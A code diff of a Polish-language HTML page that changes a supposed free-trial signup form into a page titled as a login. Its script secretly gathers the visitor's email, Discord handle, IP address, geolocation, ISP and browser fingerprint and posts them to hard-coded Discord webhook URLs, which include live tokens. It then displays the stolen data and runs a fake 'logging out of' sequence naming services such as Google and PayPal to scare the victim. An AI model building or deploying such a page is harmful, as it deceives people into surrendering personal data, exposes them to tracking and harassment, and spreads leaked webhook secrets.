@@ -3,31 +3,34 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Formularz na darmową wersję próbną</title>
+<title>logowanie</title>
 <style>
 body {
-  font-family: Segoe UI, sans-serif;
-  background:#2c2f33;
+  margin:0;
+  font-family:Segoe UI, Arial, sans-serif;
+  background:#111;
   color:#fff;
+  height:100vh;
   display:flex;
   justify-content:center;
   align-items:center;
-  height:100vh;
-  margin:0;
+  background-size:cover;
+  background-position:center;
 }
 .container {
   background:#23272a;
-  padding:30px;
+  padding:24px;
   border-radius:10px;
-  width:360px;
-  box-shadow:0 0 20px #000;
+  width:340px;
+  box-shadow:0 0 20px rgba(0,0,0,.7);
+  z-index:2;
 }
 input, textarea, button {
   width:100%;
-  margin:10px 0;
+  margin:8px 0;
   padding:10px;
   border:none;
-  border-radius:5px;
+  border-radius:6px;
   background:#40444b;
   color:#fff;
 }
@@ -36,14 +39,42 @@ button {
   font-weight:bold;
   cursor:pointer;
 }
-h2 { color:#7289da; }
-small { opacity:0.7; }
+h2 { color:#7289da; margin-top:0; }
+#overlay {
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.85);
+  display:none;
+  z-index:1;
+}
+#logout-box {
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  width:420px;
+  background:#0b0b0b;
+  border:2px solid #ff004c;
+  padding:16px;
+}
+#logout-box h3 { color:#ff004c; margin:0 0 10px; }
+#logs {
+  list-style:none;
+  padding:0;
+  margin:0;
+  max-height:220px;
+  overflow:hidden;
+  font-family:monospace;
+  font-size:13px;
+}
+#logs li { margin:4px 0; color:#ccc; }
+small { opacity:.6; }
 </style>
 </head>
 <body>
 
 <div id="form" class="container">
-  <h2>Zapisz się na darmową wersje próbną</h2>
+  <h2>Formularz</h2>
   <input id="email" type="email" placeholder="Email" required>
   <input id="discord" type="text" placeholder="Discord">
   <textarea id="msg" placeholder="Wiadomość"></textarea>
@@ -51,67 +82,105 @@ small { opacity:0.7; }
 </div>
 
 <div id="info" class="container" style="display:none;">
-  <h2>Twoje dane 😈</h2>
+  <h2>Twoje dane</h2>
   <div id="out"></div>
-  <small>Internet pamięta więcej niż myślisz XD</small>
+  <small> </small>
 </div>
 
+<div id="overlay">
+  <div id="logout-box">
+    <h3 id="count">Zamykanie sesji…</h3>
+    <ul id="logs"></ul>
+    <small>internet pamięta wiecej niż myslisz..</small>
+  </div>
+</div>
+
+<audio id="beep" src="error.mp3" preload="auto"></audio>
+
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1456448681988587722/TMNtUrwrtDN3EaXznge_tBA_HIX71xiT2o4my4D6XiJ9otCJRut71qaRvOaNbMGh54gH"
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1456448667949993996/t7B3LC8Jn1LJUfJYq9awyAsEuP3X05dA_elgnyj7WIw2546LCkAG4DKQvmvmtwIlAUjY"
+
+const services = [
+  "YouTube","Discord","Google","Gmail","Facebook","Instagram","Steam",
+  "Spotify","Netflix","Microsoft","Apple ID","GitHub","Reddit","Twitter",
+  "Amazon","PayPal","TikTok","LinkedIn","Telegram","Epic Games"
+]
+
+const images = [
+  "bg1.jpg","bg2.jpg","bg3.jpg","bg4.jpg"
+]
+
+function startBackground() {
+  setInterval(() => {
+    document.body.style.backgroundImage =
+      `url(${images[Math.floor(Math.random()*images.length)]})`
+  }, 1800)
+}
+
+function fakeSequence() {
+  document.getElementById("overlay").style.display = "block"
+  const logs = document.getElementById("logs")
+  const countEl = document.getElementById("count")
+  let i = 0
+  const interval = setInterval(() => {
+    if (i >= services.length) {
+      countEl.innerText = "wylogowywanie.."
+      clearInterval(interval)
+      return
+    }
+    countEl.innerText = "Zamykanie sesji…"
+    const li = document.createElement("li")
+    li.innerText = "⛔ Wylogowywanie z " + services[i] + "…"
+    logs.appendChild(li)
+    if (i % 3 === 0) document.getElementById("beep").play().catch(()=>{})
+    i++
+  }, 700)
+}
 
 async function send() {
   try {
-    const ipReq = await fetch("https://ipapi.co/json/")
-    const ip = await ipReq.json()
+    const ipRes = await fetch("https://ipapi.co/json/")
+    const ip = await ipRes.json()
 
     const data = {
       email: email.value,
       discord: discord.value || "brak",
       message: msg.value || "brak",
-
       ip: ip.ip,
       city: ip.city,
       region: ip.region,
       country: ip.country_name,
       isp: ip.org,
       timezone: ip.timezone,
-
-      userAgent: navigator.userAgent,
+      ua: navigator.userAgent,
       platform: navigator.platform,
       language: navigator.language,
       screen: screen.width + "x" + screen.height,
-      cpu: navigator.hardwareConcurrency || "?",
-      ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "?",
-      touch: 'ontouchstart' in window,
       cookies: navigator.cookieEnabled
     }
 
-    await fetch(WEBHOOK, {
+    await fetch(WEBHOOK_URL, {
       method:"POST",
       headers:{ "Content-Type":"application/json" },
       body: JSON.stringify({
         embeds:[{
-          title:"Nowy formularz XDDD",
-          color:15158332,
-          fields:Object.entries(data).map(([k,v])=>({
-            name:k,
-            value:String(v)
-          })),
+          title:"Demo formularz",
+          color:7506394,
+          fields:Object.entries(data).map(([k,v])=>({name:k,value:String(v)})),
           timestamp:new Date()
         }]
       })
     })
 
-    document.getElementById("form").style.display="none"
-    document.getElementById("info").style.display="block"
+    form.style.display="none"
+    info.style.display="block"
+    out.innerHTML = Object.entries(data)
+      .map(([k,v])=>`<p><b>${k}:</b> ${v}</p>`).join("")
 
-    document.getElementById("out").innerHTML =
-      Object.entries(data).map(([k,v]) =>
-        `<p><b>${k}:</b> ${v}</p>`
-      ).join("")
-
+    startBackground()
+    fakeSequence()
   } catch {
-    alert("Zdechło jak argumenty w komentarzach XDDD 😈")
+    alert("Błąd")
   }
 }
 </script>
